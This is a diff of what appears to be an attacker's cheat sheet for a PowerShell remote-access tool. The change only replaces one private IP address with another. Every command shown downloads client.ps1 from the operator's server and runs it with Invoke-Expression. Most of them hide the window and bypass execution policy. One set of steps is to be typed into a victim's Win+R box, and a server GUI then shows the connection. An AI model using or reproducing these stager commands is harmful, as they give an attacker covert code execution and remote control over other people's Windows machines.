@@ -18,7 +18,7 @@ powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('h
 # ================================================================
 # METHOD 2: LOCAL WEB SERVER (if you don't want GitHub)
 # ================================================================
-powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"
 
 
 # ================================================================
@@ -32,7 +32,7 @@ python -m http.server 8000
 python server_professional.py
 
 # 3. Run this command in Terminal 3 (on same PC for testing):
-powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"
 
 # 4. Check server_professional.py GUI for connection
 
@@ -42,7 +42,7 @@ powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('h
 # ================================================================
 # Press: Win+R
 # Type this:
-powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"
 # Press: Enter
 
 
@@ -57,16 +57,16 @@ powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http
 # IEX(...)            → Invoke-Expression (run downloaded code)
 # New-Object Net.WebClient → Create web client
 # .DownloadString(...) → Download client.ps1 as string
-# http://172.28.1.78:8000/client.ps1 → Your server address
+# http://192.168.8.158:8000/client.ps1 → Your server address
 
 
 # ================================================================
 # EVEN SHORTER VERSION (also works):
 # ================================================================
-powershell -W Hidden -C "IEX(iwr http://172.28.1.78:8000/client.ps1 -UseBasicParsing).Content"
+powershell -W Hidden -C "IEX(iwr http://192.168.8.158:8000/client.ps1 -UseBasicParsing).Content"
 
 
 # ================================================================
 # ONE-LINER FOR TESTING (visible window):
 # ================================================================
-powershell -C "IEX(iwr http://172.28.1.78:8000/client.ps1 -UseBasicParsing).Content"
+powershell -C "IEX(iwr http://192.168.8.158:8000/client.ps1 -UseBasicParsing).Content"
